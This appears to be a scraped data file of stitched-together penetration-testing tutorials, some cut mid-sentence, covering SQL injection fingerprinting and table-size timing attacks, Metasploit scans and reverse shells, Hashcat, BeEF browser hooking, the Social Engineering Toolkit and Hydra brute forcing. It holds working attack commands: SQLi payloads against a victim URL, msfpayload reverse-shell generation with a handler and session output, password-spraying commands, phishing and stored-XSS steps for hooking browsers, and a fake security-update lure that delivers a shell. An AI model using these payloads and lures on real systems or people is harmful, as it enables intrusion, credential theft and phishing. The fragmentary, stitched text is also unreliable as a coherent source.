validation.\nPreventing SQL Injection linkParameterized Queries (Prepared Statements) linkUse parameterized queries to prevent SQL injection. This technique separates SQL code from data, ensuring user input cannot interfere with query structure.\nVulnerable Code:\nString query = \"SELECT * FROM products WHERE category = '\" + input + \"'\"; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query); Secure Code:\nPreparedStatement statement = connection.prepareStatement(\"SELECT * FROM products WHERE category = ?\"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery(); Whitelisting and Input Validation linkFor parts of the query that cannot use parameterized queries (e.g., table or column names), use whitelisting to validate input against a list of permitted values.\nAdditional Best Practices link Escape User Input: Properly escape special characters in user inputs. Use ORM Libraries: Object-Relational Mapping (ORM) libraries can help mitigate SQL injection by abstracting SQL queries. Least Privilege: Ensure database accounts have the minimum privileges necessary. Conclusion linkSQL injection remains one of the most critical security vulnerabilities in web applications. Understanding how to detect, exploit, and prevent SQL injection is crucial for developers, testers, and security professionals. By following best practices such as using parameterized queries and whitelisting, you can significantly reduce the risk of SQL injection attacks.\n"

                content: "Introduction linkReconnaissance is the first step in penetration testing, where the goal is to gather information about the target network. This step involves identifying active hosts, their operating systems, open ports, and running services. A Discovery Scan in Metasploit is a comprehensive method to collect this information efficiently.\nHow a Discovery Scan Works linkA Discovery Scan in Metasploit uses Nmap to perform various scans and gather information. It includes the following phases:\nPing Scan Port Scan OS and Version Detection Data Import Ping Scan linkThe ping scan determines if the hosts are online. Nmap performs an ICMP ping sweep by sending an ICMP echo request to the target. If an ICMP echo reply is received, the host is considered online and included in the port scan.\nPort Scan linkDuring the port scan, Nmap identifies open ports and the services running on those ports. The scan covers commonly exposed ports like HTTP, telnet, SSH, and FTP. The default scan is a TCP SYN scan, but you can customize it by adding Nmap options.\nOS and Version Detection linkAfter identifying open ports, Nmap sends probes to these ports to detect the operating system and service versions. This phase provides valuable information that helps identify vulnerabilities and reduce false positives.\nData Import linkMetasploit Pro imports the data collected by Nmap into the project. This data includes host information, open ports, running services, and potential vulnerabilities. Metasploit uses this information to run additional modules and refine the penetration test.\nRunning a Discovery Scan linkTo run a Discovery Scan in Metasploit, follow these steps:\nInitiate the Scan:\nNavigate to the project overview or analysis page. Click the “Scan” button to start a new discovery scan. Specify Target Addresses:\nEnter the target addresses in the provided field. You can input single IP addresses, ranges, or CIDR notations. Separate multiple addresses with new lines. Advanced Options (Optional):\nClick “Show Advanced Options” to configure additional settings such as custom Nmap arguments, specific port ranges, excluded ports, scan speed, and more. Launch the Scan:\nClick the “Launch Scan” button to begin the scan. Monitor the Scan:\nThe task log displays the progress and status of the scan. Upon completion, the status will show ‘Complete’ if successful or ‘Failed’ if errors occurred. Viewing Scan Results linkTo view the results of the Discovery Scan:\nNavigate to the Hosts Page:\nSelect “Hosts \u003e Analysis” to view detailed information about the scanned hosts. Host Information:\nFor each host, you can see: IP address Host name Operating system Active services Timestamp of the last update Host status (scanned, shelled, looted, cracked) Host Status Hierarchy link Scanned: Indicates a discovery scan, Nexpose scan, or import was performed. Shelled: Indicates that a session was opened on the host. Looted: Indicates that files or screenshots were obtained from the host. Cracked: Indicates that a password hash from the host was decrypted into plain text. Discovery Scan Options linkTarget Addresses linkDefines individual hosts or network ranges to scan.\nInitial Port Scan linkPerforms a port scan before service version verification.\nCustom Nmap Arguments linkSends additional flags and commands to Nmap, overriding default settings.\nAdditional and Excluded TCP Ports linkSpecifies additional ports to include or exclude from the scan.\nCustom TCP Port Range linkDefines a specific range of TCP ports for the scan.\nPortscan Speed linkAdjusts the scan speed using Nmap’s timing templates:\nInsane (5): Fastest, less accurate. Aggressive (4): Fast, assumes reliable network. Normal (3): Default speed. Polite (2): Slower, uses less bandwidth. Sneaky (1): IDS evasion speed. Paranoid (0): Slowest, for maximum stealth. Portscan Timeout linkSets the time limit for Nmap to spend on each host (default is 5 minutes).\nUDP Service Discovery linkFinds all services on the network using custom Metasploit modules instead of Nmap.\nScan SNMP Community Strings and H.323 Video Endpoints linkScans for devices responding to SNMP and H.323 protocols.\nEnumerate Users via Finger linkQueries usernames and bruteforces the user list if the Finger protocol is detected.\nIdentify Unknown Services linkDetects unknown services and applications on the network.\nSingle Scan linkScans hosts individually, storing information before moving to the next host.\nDry Run linkPrepares the scan without executing it, displaying options in the task log.\nWeb Scan linkRuns a web scan, web audit, and web exploit along with the discovery scan (recommended for small sets of hosts).\nSMB User Name, Password, and Domain linkDefines SMB credentials to attempt login to SMB services.\nSpecifying IPv6 Addresses linkManually add or import IPv6 addresses as Metasploit Pro does not automatically detect them.\nImporting IPv6 Addresses link Import a File:\nSelect “Analysis \u003e Hosts”. Click “Import” and browse to the file containing IPv6 addresses. Add Manually:\nSelect “Analysis \u003e Hosts”. Click “New Host” and enter the IPv6 address and other optional information. Conclusion linkA Discovery Scan is a powerful tool in Metasploit for gathering detailed information about a network. By understanding the phases of a discovery scan and how to configure and interpret its results, penetration testers can gain valuable insights and fine-tune their attack strategies effectively.\n"

We will explore how hashing works, the features of Hashcat, and provide step-by-step instructions for its installation and use.\nDeeper Understanding to Password Hashing? linkHashing converts an alphanumeric string into a fixed-size string using a hash function, a mathematical function that generates another alphanumeric string from the input.\nHow Hashing Works link Hash Algorithms: Common algorithms include MD5, SHA1, and SHA256. Despite the length of the input, the hash produced is always of a fixed length. Example: Using the MD5 algorithm, the string “Password123” hashes to: 42f749ade7f9e195bf475f37a44cafcb The string “HelloWorld1234” hashes to: 850eaebd5c4bb931dbb2bbcf7994c021 Encoding vs. Hashing link Encoding: Transforms data into another format using a scheme that is reversible, such as Base64. for example:\nUGFzc3dvcmQxMjM= Hashing: Irreversible transformation, used for security purposes. Introduction to Hashcat linkHashcat is a fast password recovery tool that helps break complex password hashes. It is a flexible and feature-rich tool that offers many ways of finding passwords from hashes.\nHashcat is also one of the few tools that can work with the GPU. While CPUs are great for sequential tasks, GPUs have powerful parallel processing capabilities. GPUs are used in Gaming, Artificial intelligence, and can also be used to speed up password cracking.\nKey Features link Open Source: Fully open source and actively maintained. Multi-Platform Support: Compatible with Windows, Linux, and Mac. Algorithm Support: Supports over 200 hashing algorithms. Parallel Cracking: Capable of cracking multiple hashes simultaneously. Benchmarking: Built-in benchmarking to test performance. How to Install Hashcat linkInstalling on Linux linkFor Ubuntu/Debian-based systems, use:\n$ sudo apt install hashcat Installing on Mac linkUsing Homebrew:\n$ brew install hashcat Working with Hashcat linkCreating Hashes linkBefore cracking passwords, generate hashes to work with. For example, using MD5 and SHA1:\nMD5: 42f749ade7f9e195bf475f37a44cafcb SHA1: b2e98ad6f6eb8508dd6a14cfa704bad7f05f6fb1 We can store these hashes under the names md5.txt and sha1.txt to use them when working with Hashcat.\nCracking Hashes linkHashcat uses specific flags to crack hashes:\nSyntax:\n$ hashcat -m -a Example: Cracking an MD5 hash using the RockYou wordlist:\n$ hashcat -m 0 -a 0 md5.txt rockyou.txt You should get the output with the text.\nAttack Modes link Dictionary Attack (-a 0): Uses a wordlist to generate and compare hashes. Combinator Attack (-a 1): Combines words from a wordlist to form possible passwords. For example, if our wordlist contains the words “pass”, ”123\", and ”hello”, Hashcat will generate the following wordlist. passpass pass123 passhello 123pass 123123 123hello hellopass hello123 hellohello As you can see, using a simple wordlist can give us a number of combinations. This attack is great if we know some terms that might be used in the password. Keep in mind that, the larger the initial wordlist, the more complicated the final wordlist gets.\nMask Attack (-a 3): The mask attack is similar to the dictionary attack, but it is more specific. Brute-force approaches like dictionary attacks can take a long time to crack a password. But if we have information regarding the password, we can use that to speed up the time it takes to crack the password. For example, if we know the length of the password and a few characters that might be in the password, we can generate a custom wordlist with those characters.\nThe mask attack is out of scope for this article, but you can learn more about mask attacks here.\nIn addition to these common attack types, there are more attack modes in Hashcat. This includes Hybrid mode, Permutation attack, Rule-based attack, and so on. Each of these modes can be used for specific use cases and to speed up password cracking.\nDefending Against Hashcat linkTo protect against hash cracking:\nUse Strong Passwords: Lengthy and complex passwords are harder to crack. Add Salts: A salt is an additional string added to a password before hashing, making precomputed attacks like rainbow tables ineffective. Dynamic Salts: Use a function to generate a unique salt for each password. Summary linkHashing is the method of using a mathematical function to generate a random string. It is a one-way function and helps to secure data such as user passwords.\nHashcat is a powerful tool that helps to crack password hashes. Hashcat supports most hashing algorithms and can work with a variety of attack modes.\nTo enforce security and protect hashes from attacks, use strong passwords and salts before hashing passwords.\n"

                description: "Learn more about SQLMap",
                content: "Database fingerprinting is a crucial step in SQL injection attacks. Identifying the underlying database management system (DBMS) allows attackers to fine-tune their injected segments and fully exploit vulnerabilities. This guide explores techniques for fingerprinting a database using SQL injection.\nError Messages linkOne of the simplest ways to fingerprint a database is through error messages. When a database error is generated, the error message often includes information about the DBMS.\nExample:\nORA-01789: query block has incorrect number of result columns. The error prefix “ORA” and the 5-digit error number indicate that Oracle is the underlying database. Each DBMS has a unique error message structure, making it easier to identify the DBMS.\nExtracting Database Version linkAnother method to identify the DBMS is to retrieve the database version using a UNION SELECT statement. Here’s how to obtain the database version for popular DBMS:\nOracle: SELECT banner FROM v$version WHERE rownum=1; SQL Server and MySQL: SELECT @@version; Example Injection:\n1 AND 1=2 UNION SELECT 1, 2, @@version Resulting Query:\nSELECT id, qty, name FROM products WHERE id=1 UNION SELECT 1, 2, @@version; Example Result:\nMicrosoft SQL Server 2008 (SP1) - 10.0.2531.0 (X64) Mar 29 2009 10:11:52 Copyright (c) 1988-2008 Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) This output not only identifies the DBMS but also provides detailed version information.\nInference Database Fingerprinting linkIf no direct information is returned to the end user, the attacker can still identify the DBMS using inference testing. The idea is to submit SQL segments valid only for one specific DBMS. If the segment executes successfully, the DBMS is identified.\nNumeric Input linkInject a numeric function that exists in only one DBMS. If the function is not recognized, an error will occur. Otherwise, the function will execute and return a value.\nNumeric Functions:\nMySQL: POW(1,1) Oracle: BITAND(1,1) SQL Server: SQUARE(1) Example Test for MySQL:\nhttp://www.victim.com/author.php?id=6-POW(1,1) If the same page is displayed as with the original URL, it suggests that MySQL is the backend database.\nText Input linkUse text functions or concatenation operators unique to each DBMS.\nConcatenation Operators:\nOracle: 'abc' || 'def' MySQL: 'abc' 'def' SQL Server: 'abc' + 'def' Example Test for MySQL:\nhttp://www.victim.com/author.php?nickname='Steeve' 'Jobs' If the same page is returned, MySQL is likely the DBMS.\nBlind SQL Injection linkFor blind SQL injection, inference testing can be used with functions unique to a single DBMS. A time-based test is often effective.\nExample Time-Based Test:\nSELECT id, qty, name FROM products WHERE id=1 AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0); If the response is delayed, it indicates the database server is running MySQL version 5.x.\nAlternative Solutions linkWhen previous techniques fail, assumptions can be made based on the web application technology. For example:\nASP.NET applications are likely using SQL Server. PHP applications typically use MySQL. Network scanning tools like nmap can also fingerprint databases but are outside the scope of SQL injection techniques.\nConclusion linkIdentifying the underlying DBMS is critical for exploiting SQL injection vulnerabilities effectively. Techniques like error message analysis, version extraction, inference testing, and time-based attacks provide various ways to fingerprint a database. Using these methods, attackers can tailor their injection strategies to the specific database system, maximizing the impact of their attacks. Always ensure that such activities are conducted ethically and with proper authorization.\n"

                description: "Learn more about SQLMap",
                content: "Estimating the size of a MySQL table using SQL injection can provide valuable information to an attacker. Knowing the approximate number of records in a table helps estimate the time required to extract all the data, which is crucial when dealing with slow or limited extraction techniques.\nHow It Works linkWhen a SELECT query is executed, the database engine evaluates all records returned by the statement to ensure they satisfy the WHERE clause. By injecting a short time delay in the WHERE clause, it is possible to estimate the number of records in the table. This technique leverages MySQL’s SLEEP() function, which can be integrated into any SQL query.\nEstimating Table Size with SQL Injection linkConcept linkIf a table has 5000 rows and a SLEEP(0.01) function is injected, it will result in a 50-second delay before the server response is sent. If the table has 300 records, the delay will be 3 seconds. The attacker starts with a short delay and gradually increases it until a noticeable total delay is observed.\nExample Process linkAssume the attacker does not know the table names or the number of rows in each table. Here’s how the attacker proceeds:\nFirst Query (Short Delay): SELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.001); **Result:** Response is returned quickly (clearly under 1 second). This indicates that either there are far fewer than 1000 records, or the field is not vulnerable to SQL injection. Second Query (Longer Delay): SELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.1); **Result:** The response takes a few seconds. This suggests there are between 20 and 50 records. Third Query (Fine Tuning the Delay): SELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.5); **Result:** This query takes just over 19 seconds to execute. This indicates approximately 38 records in the table, which is accurate as the test environment's `products` table has exactly 38 rows. Important Considerations linkWHERE Clause Conditions linkEach injection example includes an always false condition to ensure the SLEEP() function is executed. If the database engine skips the time delay, the results will be inaccurate.\nFor example, if 50% of the products come from the same supplier:\nSELECT * FROM products WHERE supplier=1 OR SLEEP(0.5); Result: This query takes 9.5 seconds to execute.\nThe database engine may skip the SLEEP() function if the first part of the condition is true. The attacker might conclude there are 19 records when there are actually twice as many. Ensure the SLEEP() function is executed for each row by using always false conditions like:\nSELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.5); SELECT from Multiple Tables linkThis technique does not work when data comes from multiple tables. If the SELECT query joins multiple tables, the estimated size might not be accurate. Assumptions can be made from the results returned on the page, but this requires careful analysis.\nConclusion linkEstimating the size of a MySQL table using SQL injection provides attackers with an understanding of the number of records, helping to plan data extraction efficiently. This technique relies on injecting time delays in the WHERE clause and observing the server response times. Always ensure the time delay is executed for each row by using appropriate conditions in the WHERE clause.\n"

These are broken down into twelve categories, including: “Exploits, Network, and Social Engineering.”\nGoogle Phishing linkThe Google Phishing command is a module within BeEF that aims to trick the user of a hooked browser into revealing their Google credentials.\nLet’s execute the command, and on the victim’s browser, they should be presented with the fake login page.\nFake Notification Bar linkThe Fake Notification Bar command is another module within BeEF designed for social engineering attacks.\nWhen this module is executed on a hooked browser, it displays a fake notification bar at the top of the target browser window. The content of this notification bar can be customized and designed to trick the user into clicking a link or downloading a file.\nFor our demo, we will be using a reverse shell payload. If the user is tricked into downloading and running the file, it will open a reverse shell to our machine. A reverse shell allows us to execute commands remotely on the victim’s system, giving us complete control over it.\nFor more information on reverse shells, see our reverse shell cheat sheet.\nWe will use the “Fake Notification Bar (Firefox)” module as the user’s browser is Firefox, but you choose which applies to your situation.\nPlease ensure that you set the “Plugin URL” to the location of the reverse shell. You can leave the “Notification text” or change it to fit your needs.\nWe changed our text to read: Critical Security Alert: Your Firefox browser is critically outdated! Click here to install the urgent security update now.\nOnce we click ‘Execute,” the user will be presented with a notification bar.\nSession Cookies linkSession cookies, also known as temporary cookies, store information about a user’s activity during a single browsing session. They help websites remember user actions, such as login credentials or items added to a shopping cart, and are deleted when the browser is closed.\nIn BeEF, we can exploit session cookies using the “Get Cookie” module. To do this, select “Get Cookie” and press the “Execute” button. The retrieved session cookies will appear in the “Command results” window.\nFrom an attacker’s perspective, session cookies are highly valuable. With these cookies, an attacker can impersonate a user on a website (such as an e-commerce site or a member section of a forum) by hijacking their session. This allows the attacker to gain unauthorized access to the user’s account and potentially perform actions on their behalf.\n"

                description: "In this section, you will learn about the Social Engineering Toolkit and provide a beginner’s guide to using it.",
                content: "What is Social Engineering? linkTechnology is making it easier for cyber criminals to exploit human behavior, cognitive biases, and social dynamics. The most common attack method used by hackers is social engineering. In other words, it’s influencing someone to do something or say something. Many types of social engineering attacks are out there, including phishing, pretexting, baiting, and tailgating.\nWhat is the Social Engineering Toolkit(SET)? linkSocial Engineering Toolkit (SET) is a versatile tool that enables you to simulate a wide range of social engineering attacks. It’s a free, open-source tool that is pre-installed in Kali Linux. The SET provides a range of options for launching different types of social engineering attacks, such as spear-phishing, credential harvesting, bypassing anti-virus software, and generating infectious media.\nInstallinstaion linkTo install the Social Engineering Toolkit on your system, simply open the terminal window and type the following command: Make sure you have git installed\ngit clone https://github.com/trustedsec/social-engineer-toolkit/ set/ cd set/ pip install -r requirements.txt Once the installation is complete, you can launch the Social Engineering Toolkit by typing the following command:\nsudo setoolkit If you select 1 (type in 1), you will open the toolkit and you will see the following list:\nTHE SET options link1) Spear-Phishing Attack Vectors linkSpear-phishing is a targeted attempt to steal sensitive information such as account credentials or financial information from a specific individual, often for malicious reasons, by masquerading as a trustworthy entity. The Social Engineering Toolkit provides several tools to conduct spear-phishing attacks, including:\nEmail Attack Vector: This allows the attacker to send emails that appear to come from a trusted source, containing malicious links or attachments. Credential Harvester Attack Method: This captures credentials from the victim through phishing websites that mimic legitimate sites. Spear-Phishing Attack: This is a highly targeted email attack aimed at a specific individual or organization. 2) Website Attack Vectors linkWebsite attack vectors involve compromising a website to deliver a malicious payload to visitors. SET offers various methods to perform these attacks, such as:\nJava Applet Attack Method: Embeds a malicious Java applet into a website to exploit vulnerabilities in the victim’s browser. Metasploit Browser Exploit Method: Integrates with the Metasploit framework to deliver browser-based exploits. Credential Harvester Attack Method: Clones a website to harvest credentials from unsuspecting users. 3) Infectious Media Generator linkThe Infectious Media Generator creates malicious files that can be delivered via USB drives or other media. When the media is accessed, the payload executes, compromising the victim’s system. This method capitalizes on the human tendency to trust and insert removable media into their devices.\nAutorun.inf File Creation: Automatically runs the payload when the media is inserted into a Windows machine. File-Format Exploits: Embeds exploits within common file types like PDFs or Office documents. 4) Create a Payload and Listener linkCreating a payload and listener involves generating a malicious payload that can be executed on a victim’s system and setting up a listener to control the compromised system.\nPayload Creation: Using tools like Metasploit to generate payloads (e.g., reverse shells, Meterpreter sessions). Listener Configuration: Setting up a listener to receive the connection from the compromised system and execute commands on it. 5) Mass Mailer Attack linkThe Mass Mailer Attack is designed to send a large number of phishing emails to multiple targets simultaneously. This attack can be customized to appear as though it comes from a trusted source and can include attachments or links to malicious sites.\nEmail Template Customization: Personalize emails to increase the chances of success. SMTP Server Configuration: Use an SMTP server to send out the mass emails. 6) Arduino-Based Attack Vector linkAn Arduino-based attack vector uses the Arduino hardware platform to create physical devices that can perform various types of attacks, such as:\nHuman Interface Device (HID) Attacks: Emulate keyboards or mice to execute pre-programmed scripts on the target system. Wireless Network Attacks: Use Arduino to create rogue access points or perform deauthentication attacks. 7) Wireless Access Point Attack Vector linkThe Wireless Access Point Attack Vector involves setting up rogue access points to intercept or manipulate network traffic. Attackers can use this method to perform man-in-the-middle (MITM) attacks or capture credentials.\nRogue AP Creation: Set up a fake access point to trick users into connecting. Credential Harvesting: Capture login credentials or other sensitive data transmitted over the network. 8) QRCode Generator Attack Vector linkThe QRCode Generator Attack Vector creates malicious QR codes that, when scanned, direct users to malicious websites or initiate unwanted actions on their devices.\nURL Redirection: Direct users to phishing sites or sites that exploit vulnerabilities. Command Execution: Execute commands on the victim’s device through embedded URLs. 9) Powershell Attack Vectors linkPowershell Attack Vectors leverage PowerShell, a powerful scripting language in Windows, to execute malicious scripts or commands on a target system.\nPowerShell Payloads: Create scripts that download and execute additional payloads. Obfuscation Techniques: Use obfuscation to evade detection by security software. 10) Third Party Modules linkThird Party Modules in SET allow for the integration of external tools and scripts to extend the toolkit’s capabilities. Users can import and use additional modules to perform a wide range of attacks.\nCustom Exploits: Integrate custom exploits or scripts to enhance attack vectors. Community Contributions: Utilize modules developed by the community for specific use cases or attacks. These explanations cover the key components and functionalities of each attack vector within the Social Engineering Toolkit (SET). If you need more specific details or examples for any of these items, feel free to ask!\n"

This article explores the various libraries, dependencies, and functionalities built into Metasploit for dealing with password hashes and cracking them using John the Ripper (JtR) and Hashcat. Note that storing credentials in the Metasploit database is covered separately.\nUnderstanding Hashes in Metasploit linkMetasploit supports extracting hashes from various software systems, including operating systems (Windows, macOS, Linux) and applications (Postgres, Oracle). The framework includes a library to identify hash types, standardizing to John the Ripper’s formats.\nIdentifying Hash Types linkMetasploit uses the identify.rb library to identify hash types. This library can be given a hash and will return the corresponding JtR type. This standardization ensures consistency across different modules and future updates.\nExample of Hash Identification linkHere’s a simple example demonstrating how to load the library and call its function:\nrequire 'metasploit/framework/hashes/identify' puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" puts identify_hash \"This_is a Fake Hash\" puts identify_hash \"_9G..8147mpcfKT8g0U.\" Output:\nmsf5 \u003e irb [*] Starting IRB shell...

                title: "Hooking Web Browsers with BeEF",
                description: "Now that you know how to install and start BeEF, let’s explore how to exploit a browser by hooking into it.",
                content: "What Is Browser Exploitation? linkBrowser exploitation involves leveraging security vulnerabilities in a web browser to perform unauthorized actions. This can include a range of techniques aimed at gaining control over the browser or the system on which it’s running, or to steal sensitive information. The basic principle behind browser exploitation is that a web browser, like any software, can have flaws or vulnerabilities in its code, which may cause the browser to behave in unintended ways.\nMost current desktop and mobile browsers utilize JavaScript to deliver interactive web pages and applications. With BeEF, an attacker can exploit the widespread use of JavaScript to “hook” a browser. This allows the attacker to exploit potential vulnerabilities, execute commands, and potentially gain unauthorized access or extract sensitive information.\nHooking the Browser linkNow that you understand browser exploitation and how BeEF works by injecting a malicious JavaScript file, let’s look at an example.\nBeEF provides links to demo pages within the “Getting Started” section, which can be used to demonstrate proof of concept. In a real-world application, setting up a website or web server to serve the ‘hook.js’ code is a more practical method of tricking the victim into being hooked.\nHooking the browser can be accomplished by creating a website, adding the hook script to the header of the page, and then luring the victim to visit the site through a phishing attack. This could be done via a link sent through email, social media, or other means.\nFirst, copy the link for the advanced demo page. You must change the IP address to match that of your attacking machine. This page includes the embedded hook.js script:\n`http://10.0.2.15:3000/demos/butcher/index.html` Next, find a way for the user to click on this link. For instance, you could craft a phishing email inviting company employees to participate in a contest.\nTo disguise the original URL, use a URL shortener. Once the user clicks on the shortened link, they won’t be directed to a contest page but to the BeEF demo page. At this point, their browser is hooked, granting control to the attacker.\nBeEF Demo linkWe could further enhance this setup by creating a legitimate-looking contest form, enabling us to hook the user’s browser while simultaneously collecting information via the form. Once the user’s browser is hooked, it appears in the BeEF console.\nFrom the details pane in the BeEF console, a wealth of information is available. This includes the browser type and version, the operating system it runs on, architecture, platform information, language details, installed plugins, and much more. These insights provide ethical hackers with valuable data to assess the security posture and identify potential vulnerabilities within the target’s browser environment.\nHooking With XSS linkAnother way to hook a browser is via XSS (Cross-Site Scripting). Cross-site scripting is a vulnerability where an attacker loads JavaScript into a web application via user input. This attack could lead to the exposure of sensitive information.\nThe first step in this process is to find a website vulnerable to cross-site scripting. This will allow us to inject the malicious JavaScript into the site.\nLet’s look at how an attacker could use stored XSS and BeEF to hook a browser. This method can be very effective as it can infect many users.\nOnce you’ve found a vulnerable site, inject the ‘hook.js’ JavaScript file into an input field such as “Message” below.\n—image\u003e\nWhen the victim’s browser visits the site, it loads the file and hooks the browser, enabling us to execute various commands to launch attacks or exfiltrate data.\nCross-Site Scripting Attack with BeEF Hook link Setup: Attacker identifies a website vulnerable to XSS and creates the JavaScript BeEF hook. Injection: Attacker injects the script into an inout field of the vulnerable website. Control: The attacker issues commands from the BeEF server to control the victim’s browser. Interaction: Victim visits the compromised webpage, their browser executes the script, establishing a connection with the BeEF server. "

                description: "Learn more about the Metasploit framework.",
                content: "Reverse shells are a crucial technique in penetration testing and ethical hacking, enabling attackers to gain access to a remote machine by reversing the connection back to the attacker’s machine. This blog post provides a comprehensive guide on using reverse shells in Metasploit, detailing the process step-by-step and explaining when and why to use reverse shells.\nList of Metasploit Reverse Shells linkTo list all available reverse shells in Metasploit, use the following command:\n./msfpayload -l | grep reverse As a general rule, it’s recommended to use Meterpreter payloads because they provide extensive post-exploitation capabilities such as railgun, post modules, and various Meterpreter commands.\nWindows Common Reverse Shell linkFor Windows, the most commonly used reverse shells include:\nwindows/meterpreter/reverse_tcp windows/meterpreter/reverse_http windows/meterpreter/reverse_https The HTTP and HTTPS variants can help in evading network monitoring due to their less suspicious traffic patterns.\nLinux Common Reverse Shell linkFor Linux, the preferred reverse shells are:\nlinux/x86/meterpreter/reverse_tcp linux/x64/meterpreter/reverse_tcp Additionally, the linux/x86/shell_reverse_tcp payload has proven to be highly stable.\nWhen to Use a Reverse Shell linkConsider using a reverse shell in the following scenarios:\nThe target machine is behind a different private network. The target machine’s firewall blocks incoming connections. The payload cannot bind to the required port. You are unsure of the best option to use. When a Reverse Shell Isn’t Needed linkReverse shells might not be necessary if:\nYou can backdoor an existing service (e.g., adding a user to an SSH server). You can leave a web shell on a web server supporting server-side programming languages like PHP, ASP, or ASP.net. The target machine runs remote admin tools like VNC, Remote Desktop, or SMB. How to Set Up for a Reverse Shell During Payload Generation linkWhen generating a reverse shell payload with msfpayload or msfvenom, you need to configure:\nLHOST: The IP address to which the target machine will connect. Ensure it’s reachable by the target machine, often requiring public IP configuration and port forwarding. LPORT: The port on which the target machine will connect. For the listener configuration:\nLHOST: The IP address for the listener to bind to. LPORT: The port for the listener to bind to. Ensure the listener is started before executing the reverse shell.\nDemonstration linkStep 1: Generate the Executable Payload linkOn the attacker’s machine (Box A), generate the payload:\n./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=4444 X \u003e /tmp/iambad.exe Step 2: Copy the Executable Payload to Box B linkTransfer the payload executable to the victim’s machine (Box B).\nStep 3: Set Up the Payload Handler on Box A linkConfigure and start the payload handler on Box A:\n./msfconsole -q msf \u003e use exploit/multi/handler msf exploit(handler) \u003e set payload windows/meterpreter/reverse_tcp msf exploit(handler) \u003e set LHOST 192.168.1.123 msf exploit(handler) \u003e set LPORT 4444 msf exploit(handler) \u003e run Step 4: Execute the Malicious Executable on Box B linkOn Box B, execute the payload by double-clicking the iambad.exe file.\nStep 5: View the Meterpreter Session on Box A linkOnce the payload is executed, you should see the Meterpreter session open on Box A:\n[*] Started reverse handler on 192.168.1.123:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 192.168.1.80 [*] Meterpreter session 1 opened (192.168.1.123:4444 -\u003e 192.168.1.80:1138) at 2024-06-25 19:03:43 -0500 meterpreter \u003e The meterpreter \u003e prompt indicates an active session, allowing you to interact with the target system.\nConclusion linkReverse shells are a powerful feature in Metasploit for gaining access to remote systems. By following this guide, you can effectively set up and use reverse shells for your penetration testing needs. Always ensure you have proper authorization before conducting any penetration tests.\n"

                description: "Learn more about Hydra",
                content: "Introduction linkHydra is a powerful brute-forcing tool used by penetration testers and ethical hackers to crack passwords of network services. It can perform rapid dictionary attacks against more than 50 protocols, including Telnet, FTP, HTTP, HTTPS, SMB, databases, and several other services. Developed by the hacker group “The Hacker’s Choice,” Hydra was first released in 2000 as a proof-of-concept tool for attacking network logon services.\nUnlike sequential brute-forcing tools, Hydra is a parallelized login cracker, allowing multiple connections simultaneously, significantly reducing the time required to crack a password.\nThis section will guide you through using Hydra, covering installation, common attack types, and essential flags and options. Note: This tutorial is for educational purposes only. Always obtain permission before scanning, brute-forcing, or exploiting any system.\nHow to Install Hydra linkPre-installed Systems linkHydra comes pre-installed with Kali Linux and Parrot OS. If you are using one of these, you can start working with Hydra immediately.\nUbuntu linkUse the apt package manager to install Hydra:\n$ sudo apt install hydra macOS linkHydra is available under Homebrew:\n$ brew install hydra Windows linkIt’s recommended to use a virtual box and install Linux. Using Windows for professional penetration testing is not advisable.\nHow to Work with Hydra linkStarting with Hydra linkBegin by exploring the help command to understand Hydra’s options:\n$ hydra -h This command provides a list of flags and options available in Hydra.\nSingle Username/Password Attack linkTo perform a simple attack with known username and password:\n$ hydra -l -p Example:\nAssume you had a user named admin, and password named admin hosted at 10.10.137.50. (Make sure you have a service running at a hosted address and can connect via ssh).\n$ hydra -l admin -p admin 10.10.137.50 ssh Password Spraying Attack linkTo perform a password spray attack where you test a known password against multiple usernames (in a case where you don’t know exactly who the user is):\nCreate a file called users.txt with the following content: root admin user tech steve richard Run the password spray attack: We are going to test the password “admin”. hydra -L users.txt -p admin 10.10.137.50 ssh Dictionary Attack linkTo perform a dictionary attack using a list of passwords:\nUse the RockYou wordlist, typically found at /usr/share/wordlists/rockyou.txt on Kali Linux or on (github). Run the dictionary attack: $ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Verbosity and Debugging linkHydra can be awfully quiet when running large brute-force attacks. If we have to make sure Hydra is doing what it is expected to do, there are two flags we can use.\nThe verbosity (-v) flag will show us the login attempt for each username/password combination. This can be a bit much when there are a lot of combinations to go through, but if it is something you need, we can use the verbosity flag.\nVerbosity Flag linkTo show each login attempt:\n$ hydra -v -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Debug Flag linkTo gather more detailed information:\n$ hydra -d -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Saving Results linkTo save the results of your attack:\n$ hydra -l -p -o Additional Flags and Formats linkService Specification linkSpecify the service with the IP address:\n$ hydra -l -p ssh:// Resuming Attacks linkResume a session if Hydra exits during an attack:\n$ hydra -R Custom Ports linkSpecify custom ports if services run on non-default ports:\n$ hydra -l -p -s Attacking Multiple Hosts linkAttack multiple hosts using a file containing a list of IP addresses:\n$ hydra -l -p -M Targeted Combinations linkUse specific username/password combinations:\nCreate a file combinations.txt with the format: username1:password1 username2:password2 username3:password3 Run the command: $ hydra -C combinations.txt How to Defend Against Hydra linkStrong Passwords linkUse strong passwords to make brute-force attacks difficult.\nPassword Policies linkEnforce policies to change passwords regularly.\nLimiting Authorization Attempts linkLock accounts after a few failed login attempts to prevent brute-force attacks.\nUse Re-captcha linkImplement re-captcha to prevent automated brute-force attacks.\nSummary linkHydra is a fast, flexible network brute-forcing tool essential for penetration testing. With its modular architecture and support for parallelization, Hydra can be extended to include new protocols and services easily. Always use Hydra responsibly and ethically.\n"

